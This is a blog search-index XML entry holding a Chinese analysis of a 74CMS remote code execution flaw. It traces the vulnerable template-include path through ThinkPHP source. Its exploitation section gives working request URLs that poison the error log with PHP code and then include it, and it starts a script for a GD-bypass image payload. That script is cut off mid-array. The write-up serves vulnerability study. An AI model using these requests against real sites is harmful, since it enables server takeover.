<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>74cmsRCE分析</title>
      <link href="/1368964401.html"/>
      <url>/1368964401.html</url>
      
        <content type="html"><![CDATA[<h1 id="74CMS-RCE分析"><a href="#74CMS-RCE分析" class="headerlink" title="74CMS RCE分析"></a>74CMS RCE分析</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>根据官网地址<a href="http://www.74cms.com/news/show-2497.html里修复补丁，可以知道是`assign_resume_tpl`中`fetch`方法出了问题。" target="_blank" rel="noopener">http://www.74cms.com/news/show-2497.html里修复补丁，可以知道是`assign_resume_tpl`中`fetch`方法出了问题。</a></p><p>官方的修复思路是去除E方法中的可控变量，我们先跟一下，这个E方法</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">appException</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>   <span class="token operator">=</span>   <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$trace</span>              <span class="token operator">=</span>   <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'E'</span><span class="token operator">==</span><span class="token variable">$trace</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$trace</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$trace</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'trace'</span><span class="token punctuation">]</span>     <span class="token operator">=</span>   <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTraceAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 发送404信息</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 404 Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Status:404 Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">halt</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在这里<code>$error[&#39;message&#39;]</code>变量是我们可以控制的，我们主要看它的流向，进入到<code>Log::record</code></p><pre class=" language-php"><code class="language-php">    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">record</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">,</span><span class="token variable">$level</span><span class="token operator">=</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERR</span><span class="token punctuation">,</span><span class="token variable">$record</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$record</span> <span class="token operator">||</span> <span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'LOG_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$level</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$log</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>   <span class="token string">"{$level}: {$message}\r\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>将当前报错信息写入log文件，这里应该是用来包含的点，而非漏洞的直接产生点，从这里就能知道为什么官方补丁对于panda师傅payload是没用的。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们继续向下看：</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 页面缓存</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 使用PHP原生模板</span>            <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 模板阵列变量分解成为独立变量</span>            <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 直接载入PHP模板</span>            <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'?>'</span><span class="token punctuation">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 视图解析标签</span>            <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'var'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string">'content'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 获取并清空缓存</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 内容过滤标签</span>        Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输出模板文件</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>会先判断是否使用php模版，74CMS默认使用的是THINK的模版，所以我们进入else分支，将<code>$templateFile</code>传入$params数组然后进入Hook::listen方法，我们跟进，唯一一个有用的方法是exec，我们跟进看看</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">.</span><span class="token string">'Start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">'[ '</span><span class="token punctuation">.</span><span class="token variable">$tag</span><span class="token punctuation">.</span><span class="token string">' ] --START--'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token constant">APP_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$result</span> <span class="token operator">=</span>   self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">'Run '</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">' [ RunTime:'</span><span class="token punctuation">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'_start'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'_end'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'s ]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 如果返回false 则中断插件执行</span>                    <span class="token keyword">return</span> <span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 记录行为的执行日志</span>                <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">'[ '</span><span class="token punctuation">.</span><span class="token variable">$tag</span><span class="token punctuation">.</span><span class="token string">' ] --END-- [ RunTime:'</span><span class="token punctuation">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">.</span><span class="token string">'Start'</span><span class="token punctuation">,</span><span class="token variable">$tag</span><span class="token punctuation">.</span><span class="token string">'End'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'s ]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>exec方法是用来调用插件的根据listen传进来的值，可以知道我们会调用Behavior\ParseTemplateBehavior类的run方法去处理params变量</p><pre class=" language-php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'Behavior'</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 行为扩展必须用run入口方法</span>        <span class="token variable">$tag</span>    <span class="token operator">=</span>   <span class="token string">'run'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$addon</span>   <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$addon</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$tag</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们继续跟进看如何处理$params变量，判断是否存在缓存，如果存在则直接去直接load缓存文件（即直接去包含文件），没有缓存则进入fetch方法</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 行为扩展的执行入口必须是run</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$_data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$engine</span>             <span class="token operator">=</span>   <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_content</span>           <span class="token operator">=</span>   <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span>    <span class="token operator">=</span>   <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'TMPL_CACHE_PREFIX'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'think'</span><span class="token operator">==</span><span class="token variable">$engine</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 采用Think模板引擎</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkContentCache</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token operator">||</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkCache</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 缓存有效</span>            <span class="token comment" spellcheck="true">//载入模版缓存文件</span>            Storage<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'CACHE_PATH'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'TMPL_CACHFILE_SUFFIX'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$tpl</span> <span class="token operator">=</span> Think<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token string">'Think\\Template'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 编译并加载模板文件</span>            <span class="token variable">$tpl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里loadTemplate方法的作用主要是用来获取$templateFile文件内的内容进行编译，然后生成缓存并返回CacheFile地址，不会对我们的文件内容进行处理。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$templateVar</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span>         <span class="token operator">=</span>   <span class="token variable">$templateVar</span><span class="token punctuation">;</span>    <span class="token variable">$templateCacheFile</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Storage<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$templateCacheFile</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">'tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>之后就直接调用load方法，在这里$_filename我们是可控的。由此任意文件包含形成</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$_filename</span><span class="token punctuation">,</span><span class="token variable">$vars</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span> <span class="token variable">$_filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="通过Log文件getshell"><a href="#通过Log文件getshell" class="headerlink" title="通过Log文件getshell"></a>通过Log文件getshell</h3><p>先看一下官方修复的一种利用方式如何利用：</p><p>访问url生成错误日志，这里需要注意一点的是，因为开启了缓存，如果模版解析出错就不会有任何的输出，可以通过</p><ul><li>让其正常解析模版完成（加一句正常的模版内容即可<code>&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#39;id&#39;]&quot;/&gt;</code>）</li><li>直接让其输出缓存</li></ul><p>这里采用第二种方法</p><blockquote><p>访问：<a href="http://127.0.0.1/?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=" target="_blank" rel="noopener">http://127.0.0.1/?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=</a><?php phpinfo(); ob_end_flush();?></p></blockquote><p><img src="https://i.loli.net/2020/12/21/WPwkMjLKAmztyd4.png" alt="image-20201221173254690"></p><p>成功生成日志文件</p><p><img src="https://i.loli.net/2020/12/21/zmf2GIlQxkDMOnv.png" alt="image-20201221173315551"></p><p>然后进行包含：</p><blockquote><p><a href="http://127.0.0.1/?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_21.log" target="_blank" rel="noopener">http://127.0.0.1/?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_21.log</a></p></blockquote><p><img src="https://i.loli.net/2020/12/21/xBClKRXmEMv5PVY.png" alt="image-20201221173821947"></p><h3 id="通过上传文件进行利用"><a href="#通过上传文件进行利用" class="headerlink" title="通过上传文件进行利用"></a>通过上传文件进行利用</h3><p>上传使用panda师傅说的上传点，因为使用了GD引擎对图片进行了渲染，需要绕过，这里直接使用下面的脚本生成图片绕过</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>    <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>    <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>    <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>    <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>    <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>    <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token 